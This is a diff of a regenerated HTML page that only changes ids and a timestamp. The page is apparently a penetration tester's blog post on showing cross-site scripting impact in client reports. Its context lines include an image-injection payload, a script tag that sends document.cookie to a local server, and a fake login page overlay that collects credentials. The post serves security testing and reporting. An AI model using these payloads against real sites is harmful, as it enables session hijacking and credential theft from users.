@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2023-01-07 Sat 14:50 -->
+<!-- 2023-01-14 Sat 16:29 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>&lrm;</title>
@@ -199,9 +199,9 @@
 <ul class="org-ul">
 <li><a href="index.html">home</a></li>
 </ul>
-<div id="outline-container-orgcee8469" class="outline-2">
-<h2 id="orgcee8469">Beyond alert(1)</h2>
-<div class="outline-text-2" id="text-orgcee8469">
+<div id="outline-container-orgfd250f6" class="outline-2">
+<h2 id="orgfd250f6">Beyond alert(1)</h2>
+<div class="outline-text-2" id="text-orgfd250f6">
 <p>
 Often when reporting cross-site scripting (XSS) I see the tester just show that they were able to inject some sort of <i>payload</i> that returned a popup box with a <code>1</code> in it. This is great and all, but I argue how this shows "impact" in the report to the client.
 </p>
@@ -214,9 +214,9 @@ XSS can be very dangerous and if the finding in the report just shows a popup wi
 I want to outline a few examples that I think would show more "impact" when trying to show XSS in your report.
 </p>
 </div>
-<div id="outline-container-org079f9e3" class="outline-3">
-<h3 id="org079f9e3">Setup</h3>
-<div class="outline-text-3" id="text-org079f9e3">
+<div id="outline-container-org6135d76" class="outline-3">
+<h3 id="org6135d76">Setup</h3>
+<div class="outline-text-3" id="text-org6135d76">
 <p>
 For this I only need a quick page that will echo my input in the response that I can use for testing.
 </p>
@@ -242,9 +242,9 @@ hello
 </div>
 </div>
 
-<div id="outline-container-org3937da6" class="outline-3">
-<h3 id="org3937da6">Image Injection</h3>
-<div class="outline-text-3" id="text-org3937da6">
+<div id="outline-container-orgbeeb1ec" class="outline-3">
+<h3 id="orgbeeb1ec">Image Injection</h3>
+<div class="outline-text-3" id="text-orgbeeb1ec">
 <p>
 So I'm not going to teach you what XSS is, but when I first learnt about it I was told that its a fancy way to say "JavaScript injection". Now although that is true, <code>html</code> or any other front end "language/markup" may be used in the injection point, with that in mind, I feel that it shows more impact in the report showing that you were able to inject your employers logo into the clients application.
 </p>
@@ -275,7 +275,7 @@ After using the payload above the image is now in the applications immediate res
 </p>
 
 
-<div id="org3689dc4" class="figure">
+<div id="orgfe91bb0" class="figure">
 <p><img src="./beyond_alert1/image.png" alt="image.png" />
 </p>
 </div>
@@ -285,9 +285,9 @@ In my opinion this looks far better in your report, it shows that you were able 
 </p>
 </div>
 </div>
-<div id="outline-container-org4d2dfef" class="outline-3">
-<h3 id="org4d2dfef">Session Token Hijacking</h3>
-<div class="outline-text-3" id="text-org4d2dfef">
+<div id="outline-container-org9b4ef71" class="outline-3">
+<h3 id="org9b4ef71">Session Token Hijacking</h3>
+<div class="outline-text-3" id="text-org9b4ef71">
 <p>
 Cookie stealing or session hijacking requires not only XSS but the cookie to be set without the <code>HttpOnly</code> or the session identifier to be retrievable from the applications response. As this is all about showing impact, I'd suggest only going for this option when your doing a test authenticated and with more than one user account to show privilege escalation of some sort. The typical payload for this would be <code>&lt;script src="http://127.0.0.1:8000"+document.cookie&gt;</code> however I wanted to share a way that I feel would show more impact.
 </p>
@@ -346,16 +346,16 @@ Now if I use the following payload <code>&lt;script src=http://127.0.0.1:8000/po
 </p>
 
 
-<div id="orge79e7ad" class="figure">
+<div id="org7b120df" class="figure">
 <p><img src="./beyond_alert1/cookie.png" alt="cookie.png" />
 </p>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org753a211" class="outline-3">
-<h3 id="org753a211">UI Redressing</h3>
-<div class="outline-text-3" id="text-org753a211">
+<div id="outline-container-org967b93b" class="outline-3">
+<h3 id="org967b93b">UI Redressing</h3>
+<div class="outline-text-3" id="text-org967b93b">
 <p>
 The last option I wanted to share is UI redressing, this shows that you can actually rewrite the applications response in the browser to look like a login page, and if details are submitted then they are sent to the web server. 
 </p>
@@ -383,7 +383,7 @@ Now including this file in the script source will rewrite the applications respo
 </p>
 
 
-<div id="orgfda575c" class="figure">
+<div id="org5f179c2" class="figure">
 <p><img src="./beyond_alert1/uipage.png" alt="uipage.png" />
 </p>
 </div>
@@ -393,16 +393,16 @@ Now as this is just a proof of concept its not pretty, but I hope the reader get
 </p>
 
 
-<div id="org691ef3f" class="figure">
+<div id="org22179b6" class="figure">
 <p><img src="./beyond_alert1/uicreds.png" alt="uicreds.png" /> 
 </p>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org181bb97" class="outline-3">
-<h3 id="org181bb97">Conclusion</h3>
-<div class="outline-text-3" id="text-org181bb97">
+<div id="outline-container-orgeefd4bb" class="outline-3">
+<h3 id="orgeefd4bb">Conclusion</h3>
+<div class="outline-text-3" id="text-orgeefd4bb">
 <p>
 I hope from reading the examples that showing a box with a <code>1</code> in it as your finding for XSS really does not show the impact of the finding to the client. All my examples and more are available <a href="https://gitlab.com/JxTx/xsshop">here</a>.
 </p>
